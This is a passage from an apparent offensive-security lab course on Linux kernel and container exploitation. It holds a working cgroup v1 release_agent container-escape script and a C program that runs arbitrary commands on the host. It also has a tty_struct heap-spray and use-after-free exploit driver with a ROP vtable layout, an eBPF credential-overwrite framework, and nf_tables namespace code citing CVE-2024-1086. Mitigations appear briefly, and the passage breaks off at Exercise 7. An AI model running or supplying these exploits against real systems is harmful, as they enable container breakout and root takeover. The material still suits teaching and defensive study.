# BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 427, 0, 1),  // io_uring_register
# BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

# Or disable io_uring system-wide:
sudo sysctl -w io_uring_disabled=2
```

---

### Exercise 3: Container Escape via Cgroup release_agent

**Objective:** Exploit the cgroup v1 `release_agent` mechanism to execute arbitrary commands on the container host, then detect and prevent the attack.

**Step 1: Setup vulnerable container**

```bash
# Start a container with CAP_SYS_ADMIN (simulates misconfigured deployment)
docker run -it --rm \
    --cap-add=SYS_ADMIN \
    --security-opt apparmor=unconfined \
    --security-opt seccomp=unconfined \
    --name cgroup-escape-lab \
    ubuntu:22.04 bash
```

**Step 2: Execute the escape from inside the container**

```bash
#!/bin/bash
# cgroup_escape.sh — Cgroup v1 release_agent container escape
# Run INSIDE the container

echo "[*] Cgroup v1 release_agent escape"
echo "[*] Requires: CAP_SYS_ADMIN, cgroup v1 available"

# Step 1: Mount a cgroup hierarchy (rdma is usually empty/unused)
CGRP_DIR=/tmp/cgrp_escape
mkdir -p "$CGRP_DIR"
mount -t cgroup -o rdma cgroup "$CGRP_DIR" 2>/dev/null || \
mount -t cgroup -o memory cgroup "$CGRP_DIR" 2>/dev/null || {
    echo "[-] Cannot mount cgroup. Trying alternative controllers..."
    for ctrl in cpu blkio devices; do
        mount -t cgroup -o "$ctrl" cgroup "$CGRP_DIR" && break
    done
}

if ! mountpoint -q "$CGRP_DIR"; then
    echo "[-] Failed to mount any cgroup controller"
    exit 1
fi
echo "[+] Cgroup mounted at $CGRP_DIR"

# Step 2: Create a child cgroup
EXPLOIT_DIR="$CGRP_DIR/exploit_$$"
mkdir -p "$EXPLOIT_DIR"
echo "[+] Created child cgroup: $EXPLOIT_DIR"

# Step 3: Enable notify_on_release
echo 1 > "$EXPLOIT_DIR/notify_on_release"
echo "[+] notify_on_release enabled"

# Step 4: Determine the container's root path on the host
# The overlay mount's upperdir or the per-container path
HOST_PATH=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
if [ -z "$HOST_PATH" ]; then
    # Try extracting from /proc/self/cgroup
    HOST_PATH=$(cat /proc/1/cgroup | head -1 | cut -d: -f3)
    # Fallback: use overlay workdir
    HOST_PATH=$(grep overlay /proc/mounts | grep -oP 'upperdir=\K[^,]+' | head -1)
fi

if [ -z "$HOST_PATH" ]; then
    echo "[-] Cannot determine host path for container filesystem"
    echo "    Trying generic overlay path..."
    HOST_PATH="/var/lib/docker/overlay2"
fi
echo "[+] Host path prefix: $HOST_PATH"

# Step 5: Write the payload script inside the container
PAYLOAD_PATH="/cmd_escape"
cat > "$PAYLOAD_PATH" << 'PAYLOAD'
#!/bin/sh
# This executes on the HOST when release_agent fires
echo "=== CONTAINER ESCAPE SUCCESSFUL ===" > /tmp/escape_proof
id >> /tmp/escape_proof
hostname >> /tmp/escape_proof
date >> /tmp/escape_proof
cat /etc/hostname >> /tmp/escape_proof
PAYLOAD
chmod 755 "$PAYLOAD_PATH"

# Step 6: Set the release_agent to point to our payload
echo "$HOST_PATH$PAYLOAD_PATH" > "$CGRP_DIR/release_agent"
echo "[+] release_agent set to: $(cat $CGRP_DIR/release_agent)"

# Step 7: Trigger the release_agent by creating a process in the
# child cgroup and letting it exit immediately
echo "[*] Triggering release_agent..."
sh -c "echo \$\$ > $EXPLOIT_DIR/cgroup.procs && exit"

# Step 8: Wait and check for execution
sleep 2
echo "[*] Checking for escape proof on host..."
if [ -f /tmp/escape_proof ]; then
    echo "[+] ESCAPE CONFIRMED (visible from container — host path accessible):"
    cat /tmp/escape_proof
fi

echo ""
echo "[*] Check the HOST for /tmp/escape_proof"
echo "[*] Clean up: umount $CGRP_DIR; rm -rf $EXPLOIT_DIR"

# Cleanup
umount "$CGRP_DIR" 2>/dev/null
rmdir "$EXPLOIT_DIR" 2>/dev/null
rm -f "$PAYLOAD_PATH"
```

**Step 3: Automated escape with reverse shell variant**

```c
// cgroup_escape_auto.c — Automated cgroup escape with host command execution
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>

#define CGRP_MOUNT "/tmp/cgrp_auto"
#define EXPLOIT_CGRP CGRP_MOUNT "/exploit_auto"

static int write_file(const char *path, const char *content) {
    int fd = open(path, O_WRONLY | O_TRUNC);
    if (fd < 0) return -1;
    write(fd, content, strlen(content));
    close(fd);
    return 0;
}

static char *get_host_path(void) {
    static char path[4096];
    FILE *f = fopen("/etc/mtab", "r");
    if (!f) f = fopen("/proc/mounts", "r");
    if (!f) return NULL;
    
    char line[4096];
    while (fgets(line, sizeof(line), f)) {
        char *upper = strstr(line, "upperdir=");
        if (upper) {
            upper += 9;
            char *end = strchr(upper, ',');
            if (!end) end = strchr(upper, ' ');
            if (end) *end = '\0';
            strncpy(path, upper, sizeof(path) - 1);
            fclose(f);
            return path;
        }
    }
    fclose(f);
    return NULL;
}

int main(int argc, char *argv[]) {
    const char *cmd = argc > 1 ? argv[1] : "id > /tmp/cgrp_escape_proof";
    char release_path[4096];
    char payload[4096];
    pid_t pid;
    
    printf("[*] Cgroup v1 release_agent escape (automated)\n");
    printf("[*] Command to execute on host: %s\n", cmd);
    
    // Mount cgroup
    mkdir(CGRP_MOUNT, 0755);
    char *controllers[] = {"rdma", "memory", "cpu", "blkio", NULL};
    int mounted = 0;
    for (int i = 0; controllers[i]; i++) {
        if (mount("cgroup", CGRP_MOUNT, "cgroup", 0, controllers[i]) == 0) {
            printf("[+] Mounted cgroup controller: %s\n", controllers[i]);
            mounted = 1;
            break;
        }
    }
    if (!mounted) {
        fprintf(stderr, "[-] Cannot mount cgroup (need CAP_SYS_ADMIN)\n");
        return 1;
    }
    
    // Create child cgroup
    mkdir(EXPLOIT_CGRP, 0755);
    
    // Enable notify_on_release
    write_file(EXPLOIT_CGRP "/notify_on_release", "1");
    
    // Get host path
    char *host_path = get_host_path();
    if (!host_path) {
        fprintf(stderr, "[-] Cannot determine host overlay path\n");
        umount(CGRP_MOUNT);
        return 1;
    }
    printf("[+] Host path: %s\n", host_path);
    
    // Write payload
    snprintf(payload, sizeof(payload),
             "#!/bin/sh\n%s\n", cmd);
    
    int fd = open("/cmd_auto", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    write(fd, payload, strlen(payload));
    close(fd);
    
    // Set release_agent
    snprintf(release_path, sizeof(release_path), "%s/cmd_auto", host_path);
    write_file(CGRP_MOUNT "/release_agent", release_path);
    printf("[+] release_agent → %s\n", release_path);
    
    // Trigger: fork into cgroup and exit
    pid = fork();
    if (pid == 0) {
        // Child: join cgroup and exit
        fd = open(EXPLOIT_CGRP "/cgroup.procs", O_WRONLY);
        if (fd >= 0) {
            char pidbuf[16];
            snprintf(pidbuf, sizeof(pidbuf), "%d", getpid());
            write(fd, pidbuf, strlen(pidbuf));
            close(fd);
        }
        _exit(0);
    }
    waitpid(pid, NULL, 0);
    
    printf("[+] Triggered — command executing on host\n");
    sleep(2);
    
    // Cleanup
    rmdir(EXPLOIT_CGRP);
    umount(CGRP_MOUNT);
    rmdir(CGRP_MOUNT);
    unlink("/cmd_auto");
    
    return 0;
}
```

**Verification:**
```bash
# On the HOST after running the escape:
cat /tmp/escape_proof
# Expected output:
# === CONTAINER ESCAPE SUCCESSFUL ===
# uid=0(root) gid=0(root) groups=0(root)
# subsys-target
# 2025-01-15T14:30:00+00:00
# subsys-target
```

---

### Exercise 4: TTY Subsystem Exploitation — Heap Spray with tty_struct

**Objective:** Use `/dev/ptmx` allocations for kernel heap spray to reclaim a freed vulnerable object, then redirect control flow via the `tty_operations` vtable.

**Step 1: TTY spray toolkit**

```c
// tty_spray.c — TTY-based kernel heap spray framework
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <termios.h>
#include <pty.h>

#define MAX_SPRAY 256
#define TTY_STRUCT_SIZE 736  // approximate size on x86_64 (kmalloc-1024)

struct tty_spray_ctx {
    int fds[MAX_SPRAY];
    int count;
    int target_cache;  // which kmalloc cache to target
};

int tty_spray_init(struct tty_spray_ctx *ctx) {
    memset(ctx, 0, sizeof(*ctx));
    for (int i = 0; i < MAX_SPRAY; i++)
        ctx->fds[i] = -1;
    return 0;
}

// Open /dev/ptmx to allocate tty_struct in kmalloc-1024
int tty_spray_alloc(struct tty_spray_ctx *ctx, int count) {
    printf("[spray] Allocating %d tty_struct objects (kmalloc-1024)\n", count);
    
    for (int i = 0; i < count && ctx->count < MAX_SPRAY; i++) {
        ctx->fds[ctx->count] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (ctx->fds[ctx->count] < 0) {
            perror("open /dev/ptmx");
            printf("[spray] Allocated %d of %d requested\n", i, count);
            return i;
        }
        ctx->count++;
    }
    
    printf("[spray] Successfully allocated %d tty_struct objects\n", count);
    return count;
}

// Free specific tty_struct (creates hole for reclaim)
void tty_spray_free_index(struct tty_spray_ctx *ctx, int index) {
    if (index >= 0 && index < ctx->count && ctx->fds[index] >= 0) {
        close(ctx->fds[index]);
        ctx->fds[index] = -1;
        printf("[spray] Freed tty_struct at index %d\n", index);
    }
}

// Free every other to create alternating holes
void tty_spray_free_alternating(struct tty_spray_ctx *ctx) {
    int freed = 0;
    for (int i = 0; i < ctx->count; i += 2) {
        if (ctx->fds[i] >= 0) {
            close(ctx->fds[i]);
            ctx->fds[i] = -1;
            freed++;
        }
    }
    printf("[spray] Freed %d alternating tty_structs (hole pattern)\n", freed);
}

// Trigger callbacks on remaining tty objects to detect reclaimed objects
int tty_spray_trigger(struct tty_spray_ctx *ctx) {
    int triggered = 0;
    struct termios tios;
    
    for (int i = 0; i < ctx->count; i++) {
        if (ctx->fds[i] >= 0) {
            // tcgetattr calls tty_operations->get_termios
            if (ioctl(ctx->fds[i], TCGETS, &tios) == 0) {
                triggered++;
            }
        }
    }
    printf("[spray] Triggered ioctl on %d tty objects\n", triggered);
    return triggered;
}

// Cleanup all
void tty_spray_cleanup(struct tty_spray_ctx *ctx) {
    for (int i = 0; i < ctx->count; i++) {
        if (ctx->fds[i] >= 0) {
            close(ctx->fds[i]);
            ctx->fds[i] = -1;
        }
    }
    ctx->count = 0;
}

// Demonstrate the attack pattern:
// 1. Trigger UAF on vulnerable object in kmalloc-1024
// 2. Spray tty_struct to reclaim the freed memory
// 3. Trigger use of dangling pointer → hits tty_struct
// 4. Control flow redirected via fake tty_operations
int main(void) {
    struct tty_spray_ctx ctx;
    tty_spray_init(&ctx);
    
    printf("=== TTY Heap Spray Demonstration ===\n\n");
    
    // Phase 1: Fill the kmalloc-1024 cache
    printf("[Phase 1] Filling kmalloc-1024 slab cache...\n");
    tty_spray_alloc(&ctx, 64);
    
    // Phase 2: Create holes
    printf("\n[Phase 2] Creating alternating holes...\n");
    tty_spray_free_alternating(&ctx);
    
    // Phase 3: In a real exploit, trigger the UAF here
    // The freed vuln object lands in kmalloc-1024
    printf("\n[Phase 3] (In real exploit: trigger UAF on target object)\n");
    printf("          Target object freed into kmalloc-1024\n");
    
    // Phase 4: Spray again to reclaim the freed object
    printf("\n[Phase 4] Spraying to reclaim freed object...\n");
    tty_spray_alloc(&ctx, 32);
    
    // Phase 5: Trigger the dangling reference
    printf("\n[Phase 5] Triggering dangling reference...\n");
    printf("          In real exploit: calling vuln_obj->callback()\n");
    printf("          This now dereferences tty_struct fields:\n");
    printf("          - ops pointer → attacker-controlled tty_operations\n");
    printf("          - ops->ioctl → redirected to ROP gadget/payload\n\n");
    
    // Demonstrate ioctl trigger pattern
    tty_spray_trigger(&ctx);
    
    // In a real exploit, the tty_operations table would be:
    printf("\n[*] Fake tty_operations layout for exploitation:\n");
    printf("    Offset 0x00: .open        → xchg eax, esp; ret (stack pivot)\n");
    printf("    Offset 0x08: .close       → pop rdi; ret\n");
    printf("    Offset 0x10: .write       → commit_creds\n");
    printf("    Offset 0x18: .ioctl       → initial gadget (triggered by ioctl)\n");
    printf("    Offset 0x20: .compat_ioctl→ swapgs_restore_and_return\n");
    
    tty_spray_cleanup(&ctx);
    printf("\n[+] Cleanup complete\n");
    return 0;
}
```

**Step 2: Combined with vulnerable kernel module**

```c
// tty_exploit.c — Full exploitation combining subsys_vuln module + tty spray
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define DEVICE "/dev/subsys_vuln"
#define IOCTL_MAGIC 'S'
#define IOCTL_ALLOC_OBJ     _IOW(IOCTL_MAGIC, 1, unsigned long)
#define IOCTL_FREE_OBJ      _IO(IOCTL_MAGIC, 2)
#define IOCTL_USE_OBJ       _IO(IOCTL_MAGIC, 3)
#define IOCTL_RACE_ALLOC    _IOW(IOCTL_MAGIC, 4, unsigned long)
#define IOCTL_RACE_FREE     _IO(IOCTL_MAGIC, 5)

#define SPRAY_COUNT 128
#define KMALLOC_1024 1024

int main(void) {
    int dev_fd, ptmx_fds[SPRAY_COUNT];
    int i;
    
    printf("[*] Opening vulnerable device...\n");
    dev_fd = open(DEVICE, O_RDWR);
    if (dev_fd < 0) {
        perror("open " DEVICE);
        printf("    Load the module: insmod subsys_vuln.ko\n");
        return 1;
    }
    
    // Step 1: Allocate object in kmalloc-1024 (same cache as tty_struct)
    printf("[*] Step 1: Allocating vulnerable object (size=%d → kmalloc-1024)\n",
           KMALLOC_1024);
    if (ioctl(dev_fd, IOCTL_RACE_ALLOC, (unsigned long)KMALLOC_1024) < 0) {
        perror("IOCTL_RACE_ALLOC");
        return 1;
    }
    
    // Step 2: Defragment — fill kmalloc-1024 slab
    printf("[*] Step 2: Defragmenting kmalloc-1024...\n");
    for (i = 0; i < SPRAY_COUNT / 2; i++) {
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (ptmx_fds[i] < 0) break;
    }
    int defrag_count = i;
    printf("    Allocated %d defrag objects\n", defrag_count);
    
    // Step 3: Free the vulnerable object (UAF — pointer not nulled)
    printf("[*] Step 3: Freeing vulnerable object (dangling pointer remains)...\n");
    ioctl(dev_fd, IOCTL_RACE_FREE, 0);
    usleep(50000);  // wait for workqueue
    
    // Step 4: Spray tty_struct to reclaim the freed slot
    printf("[*] Step 4: Spraying tty_struct to reclaim freed memory...\n");
    int reclaim_start = defrag_count;
    for (i = reclaim_start; i < SPRAY_COUNT; i++) {
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (ptmx_fds[i] < 0) break;
    }
    int reclaim_count = i - reclaim_start;
    printf("    Sprayed %d tty_struct objects\n", reclaim_count);
    
    // Step 5: Trigger the dangling pointer use
    printf("[*] Step 5: Triggering USE on freed object...\n");
    printf("    The object memory is now occupied by a tty_struct\n");
    printf("    global_obj->callback now points to tty_struct data\n");
    
    // In a real exploit, this would trigger callback which reads from
    // memory now containing tty_struct fields — potentially crashing
    // or, with careful spray content, redirecting execution
    printf("[!] WARNING: This may crash the kernel if not in QEMU!\n");
    printf("    In QEMU: ioctl(dev_fd, IOCTL_USE_OBJ, 0)\n");
    printf("    The callback pointer at offset 0 of the freed object\n");
    printf("    now contains tty_struct.magic or tty_struct.ops depending on layout\n");
    
    // Cleanup
    for (i = 0; i < SPRAY_COUNT; i++) {
        if (ptmx_fds[i] >= 0) close(ptmx_fds[i]);
    }
    close(dev_fd);
    
    printf("[+] Demonstration complete (no kernel crash in passive mode)\n");
    return 0;
}
```

---

### Exercise 5: eBPF Verifier Exploitation — Privilege Escalation via BPF Type Confusion

**Objective:** Understand eBPF verifier exploitation by building a conceptual exploit that demonstrates how type confusion leads to arbitrary kernel memory access and credential overwrite.

**Step 1: eBPF program loader and map interaction**

```c
// ebpf_exploit_concept.c — Conceptual eBPF verifier exploitation framework
// This demonstrates the STRUCTURE of eBPF exploits without weaponizing a specific CVE
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <stdint.h>

// BPF syscall wrapper
static int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(SYS_bpf, cmd, attr, size);
}

// Create a BPF array map
static int bpf_create_map(int map_type, int key_size, int value_size, int max_entries) {
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

// Update map element
static int bpf_map_update(int map_fd, const void *key, const void *value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// Lookup map element
static int bpf_map_lookup(int map_fd, const void *key, void *value) {
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return bpf_syscall(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

// Load BPF program
static int bpf_prog_load(enum bpf_prog_type type,
                         const struct bpf_insn *insns, int insn_cnt,
                         const char *license, char *log_buf, int log_size) {
    union bpf_attr attr = {
        .prog_type = type,
        .insns = (uint64_t)insns,
        .insn_cnt = insn_cnt,
        .license = (uint64_t)license,
        .log_buf = (uint64_t)log_buf,
        .log_size = log_size,
        .log_level = log_buf ? 1 : 0,
    };
    return bpf_syscall(BPF_PROG_LOAD, &attr, sizeof(attr));
}

// BPF instruction macros
#define BPF_MOV64_REG(dst, src) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = dst, .src_reg = src})
#define BPF_MOV64_IMM(dst, imm) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = dst, .imm = imm})
#define BPF_LD_MAP_FD(dst, fd) \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = dst, .src_reg = BPF_PSEUDO_MAP_FD, .imm = fd}), \
    ((struct bpf_insn){.code = 0, .imm = 0})
#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT})
#define BPF_CALL_INSN(func) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .imm = func})
#define BPF_STX_MEM(size, dst, src, off) \
    ((struct bpf_insn){.code = BPF_STX | BPF_MEM | size, .dst_reg = dst, .src_reg = src, .off = off})
#define BPF_LDX_MEM(size, dst, src, off) \
    ((struct bpf_insn){.code = BPF_LDX | BPF_MEM | size, .dst_reg = dst, .src_reg = src, .off = off})
#define BPF_ALU64_IMM(op, dst, imm) \
    ((struct bpf_insn){.code = BPF_ALU64 | op | BPF_K, .dst_reg = dst, .imm = imm})
#define BPF_JMP_IMM(op, dst, imm, off) \
    ((struct bpf_insn){.code = BPF_JMP | op | BPF_K, .dst_reg = dst, .off = off, .imm = imm})

// BPF helper function numbers
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2
#define BPF_FUNC_get_current_task 35

void demonstrate_ebpf_exploit_structure(void) {
    printf("=== eBPF Verifier Exploitation — Conceptual Framework ===\n\n");
    
    // Step 1: Check if BPF is available
    printf("[Step 1] Checking BPF availability...\n");
    int priv_check = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 1);
    if (priv_check < 0) {
        if (errno == EPERM) {
            printf("[-] BPF requires CAP_BPF or CAP_SYS_ADMIN\n");
            printf("    kernel.unprivileged_bpf_disabled = %d\n",
                   system("sysctl -n kernel.unprivileged_bpf_disabled 2>/dev/null") >> 8);
            return;
        }
        perror("bpf_create_map");
        return;
    }
    printf("[+] BPF available (map_fd=%d)\n", priv_check);
    close(priv_check);
    
    // Step 2: Create exploitation maps
    printf("\n[Step 2] Creating exploitation maps...\n");
    int ctrl_map = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 4);
    int data_map = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 0x1000, 1);
    if (ctrl_map < 0 || data_map < 0) {
        printf("[-] Map creation failed\n");
        return;
    }
    printf("[+] Control map fd=%d, Data map fd=%d\n", ctrl_map, data_map);
    
    // Step 3: Build exploitation BPF program
    printf("\n[Step 3] Building exploitation BPF program...\n");
    printf("    Exploitation flow:\n");
    printf("    1. bpf_get_current_task() → get task_struct pointer\n");
    printf("    2. Walk task_struct → real_cred → cred\n");
    printf("    3. Read current uid/gid from cred structure\n");
    printf("    4. Write uid=0, gid=0, cap_effective=0x1ffffffffff\n");
    printf("    5. Return — process is now root\n\n");
    
    // Conceptual program structure (NOT a working exploit)
    printf("    Conceptual BPF program layout:\n");
    printf("    ┌─────────────────────────────────────────────────┐\n");
    printf("    │ r6 = bpf_get_current_task()                     │ get task_struct\n");
    printf("    │ r7 = *(u64*)(r6 + CRED_OFFSET)                  │ task→real_cred\n");
    printf("    │ r8 = *(u32*)(r7 + UID_OFFSET)                   │ read current uid\n");
    printf("    │ *(u32*)(r7 + UID_OFFSET) = 0                    │ uid = 0\n");
    printf("    │ *(u32*)(r7 + GID_OFFSET) = 0                    │ gid = 0\n");
    printf("    │ *(u64*)(r7 + CAP_OFFSET) = 0x1ffffffffff        │ full caps\n");
    printf("    │ exit(0)                                         │\n");
    printf("    └─────────────────────────────────────────────────┘\n\n");
    
    printf("    The VERIFIER BUG allows step 3-6 to pass validation:\n");
    printf("    - Type confusion: verifier thinks r7 is bounded map pointer\n");
    printf("    - Reality: r7 is an arbitrary kernel pointer (cred struct)\n");
    printf("    - The write at step 4-6 goes to kernel memory, not map memory\n\n");
    
    // Step 4: Demonstrate safe BPF program (reads task info legally)
    printf("[Step 4] Loading SAFE BPF program (legal task info read)...\n");
    
    struct bpf_insn safe_prog[] = {
        // r6 = bpf_get_current_task()
        BPF_CALL_INSN(BPF_FUNC_get_current_task),
        BPF_MOV64_REG(6, 0),
        
        // Store task pointer in map for userspace to read
        // r1 = map_fd (ctrl_map)
        BPF_LD_MAP_FD(1, ctrl_map),
        // r2 = &key (key=0, on stack)
        BPF_MOV64_REG(2, 10),
        BPF_ALU64_IMM(BPF_ADD, 2, -4),
        BPF_STX_MEM(BPF_W, 10, 0, -4),  // key = 0 on stack
        // r3 = map_lookup_elem(map, &key)
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),
        
        // Check return (NULL = not found)
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 2),
        // Store task pointer into map value
        BPF_STX_MEM(BPF_DW, 0, 6, 0),
        
        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };
    
    char log_buf[65536] = {0};
    int prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
                                safe_prog,
                                sizeof(safe_prog) / sizeof(safe_prog[0]),
                                "GPL", log_buf, sizeof(log_buf));
    
    if (prog_fd < 0) {
        printf("[-] Safe program rejected by verifier:\n");
        printf("    %s\n", log_buf);
        printf("    (Expected — get_current_task may not be allowed in SOCKET_FILTER)\n");
    } else {
        printf("[+] Safe program loaded (fd=%d)\n", prog_fd);
        close(prog_fd);
    }
    
    // Step 5: Show what the exploit would achieve
    printf("\n[Step 5] Exploitation outcome:\n");
    printf("    Before: uid=%d gid=%d\n", getuid(), getgid());
    printf("    After exploitation: uid=0 gid=0 (full root)\n");
    printf("    Capability set: 0x000001ffffffffff (all capabilities)\n\n");
    
    printf("[*] Key CVEs demonstrating this pattern:\n");
    printf("    CVE-2021-3490: ALU32 bounds tracking type confusion\n");
    printf("    CVE-2022-23222: pointer bounds computation error\n");
    printf("    CVE-2023-2163: verifier range tracking bypass\n\n");
    
    printf("[*] Mitigation: kernel.unprivileged_bpf_disabled=2\n");
    printf("    This single sysctl eliminates the entire attack class\n");
    printf("    for unprivileged attackers.\n");
    
    close(ctrl_map);
    close(data_map);
}

int main(void) {
    demonstrate_ebpf_exploit_structure();
    return 0;
}
```

---

### Exercise 6: Netfilter/nf_tables Exploitation — User Namespace to CAP_NET_ADMIN to UAF

**Objective:** Demonstrate how user namespaces provide `CAP_NET_ADMIN` for nf_tables exploitation, walk through the CVE-2024-1086 exploitation pattern.

**Step 1: User namespace capability escalation**

```c
// ns_netfilter.c — Gain CAP_NET_ADMIN via user namespace for nf_tables access
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <errno.h>
#include <fcntl.h>

static void write_uid_map(pid_t pid) {
    char path[64], map[64];
    
    snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
    snprintf(map, sizeof(map), "0 %d 1\n", getuid());
    int fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
    
    snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
    fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, "deny\n", 5); close(fd); }
    
    snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
    snprintf(map, sizeof(map), "0 %d 1\n", getgid());
    fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
}

static int check_cap_net_admin(void) {
    // Try to create a netlink socket for nf_tables
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) return 0;
    
    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pid = getpid(),
    };
    
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }
    
    close(sock);
    return 1;
}

static int nft_worker(void *arg) {
    // Wait for uid/gid mapping
    sleep(1);
    
    printf("[child] PID=%d in new user+net namespace\n", getpid());
    printf("[child] uid=%d gid=%d\n", getuid(), getgid());
    
    if (check_cap_net_admin()) {
        printf("[+] CAP_NET_ADMIN available in namespace!\n");
        printf("[+] nf_tables operations are now possible\n\n");
        
        printf("[*] Exploitation pattern (CVE-2024-1086 style):\n");
        printf("    1. Create nf_tables table + chain + rule\n");
        printf("    2. Configure verdict with NF_DROP + NF_QUEUE\n");
        printf("    3. Trigger reference counting error in nft_verdict_init\n");
        printf("    4. Double-free of verdict object\n");
        printf("    5. Reclaim with controlled object (msg_msg/setxattr)\n");
        printf("    6. Arbitrary read/write via corrupted verdict pointers\n");
        printf("    7. Overwrite cred structure → root in init namespace\n\n");
        
        // Demonstrate netlink message construction for nf_tables
        int nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
        if (nl_sock >= 0) {
            printf("[*] Netlink socket opened (fd=%d)\n", nl_sock);
            printf("[*] Sending NFT_MSG_NEWTABLE...\n");
            
            // Construct NFT_MSG_NEWTABLE message
            struct {
                struct nlmsghdr nlh;
                struct nfgenmsg nfg;
                char attrs[256];
            } msg;
            
            memset(&msg, 0, sizeof(msg));
            msg.nlh.nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
            msg.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
            msg.nlh.nlmsg_seq = 1;
            msg.nfg.nfgen_family = NFPROTO_IPV4;
            msg.nfg.version = NFNETLINK_V0;
            
            // Add table name attribute
            struct nlattr *nla = (struct nlattr *)msg.attrs;
            nla->nla_type = NFTA_TABLE_NAME;
            nla->nla_len = sizeof(struct nlattr) + 12;
            memcpy((char *)nla + sizeof(struct nlattr), "exploit_tbl", 12);
            
            msg.nlh.nlmsg_len = sizeof(msg.nlh) + sizeof(msg.nfg) +
                                NLA_ALIGN(nla->nla_len);
            
            struct sockaddr_nl dest = { .nl_family = AF_NETLINK };
            int ret = sendto(nl_sock, &msg, msg.nlh.nlmsg_len, 0,
                           (struct sockaddr *)&dest, sizeof(dest));
            
            if (ret > 0) {
                printf("[+] NFT_MSG_NEWTABLE sent successfully (%d bytes)\n", ret);
                printf("[+] Table 'exploit_tbl' created in namespace\n");
            } else {
                printf("[-] sendto failed: %s\n", strerror(errno));
            }
            
            close(nl_sock);
        }
    } else {
        printf("[-] CAP_NET_ADMIN not available\n");
    }
    
    return 0;
}

int main(void) {
    printf("=== User Namespace → CAP_NET_ADMIN → nf_tables Access ===\n\n");
    
    // Check if user namespaces are available
    FILE *f = fopen("/proc/sys/user/max_user_namespaces", "r");
    if (f) {
        int max_ns;
        fscanf(f, "%d", &max_ns);
        fclose(f);
        printf("[*] max_user_namespaces = %d\n", max_ns);
        if (max_ns == 0) {
            printf("[-] User namespaces disabled. Cannot proceed.\n");
            printf("    Mitigation working: user.max_user_namespaces = 0\n");
            return 1;
        }
    }
    
    printf("[*] Creating user namespace + network namespace...\n");
    
    char stack[65536];
    pid_t child = clone(nft_worker, stack + sizeof(stack),
                        CLONE_NEWUSER | CLONE_NEWNET | SIGCHLD, NULL);
    
    if (child < 0) {
        perror("clone");
        return 1;
    }
    
    // Setup uid/gid mappings
    write_uid_map(child);
    
    waitpid(child, NULL, 0);
    
    printf("\n[*] Mitigation: sysctl user.max_user_namespaces=0\n");
    printf("[*] Or: block 'unshare' in seccomp profile\n");
    return 0;
}
```

---

### Exercise 7: Seccomp User-Notification TOCTOU Attack

**Objective:** Exploit the time-of-check-to-time-of-use race in seccomp user-notification supervisors to bypass path-based access control.

```c
